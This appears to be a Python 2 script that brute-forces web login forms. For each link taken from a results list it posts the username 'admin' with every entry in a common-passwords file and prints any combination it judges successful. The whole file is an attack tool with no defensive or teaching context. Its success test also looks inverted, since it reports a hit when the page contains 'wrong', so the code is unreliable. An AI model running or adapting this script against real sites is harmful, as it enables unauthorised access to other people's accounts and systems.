import requests
from utility import *

banner(HP)

usernames = ['admin']
commons = 'hack_password_commons.txt'
f = open(commons, 'r')
passwords = f.read().splitlines()

nugget = 'wrong'

results = read_results()
for result in results:
    link = result['link']
    url = get_url(link)
    for u in usernames:
        for p in passwords:
            payload = {
                'username': u,
                'password': p
            }
            req = requests.post(link, data=payload)
            if req.content.find(nugget) != -1:
                success_message('username: ' + u + '\t' + 'password: ' + p)

print '\n'
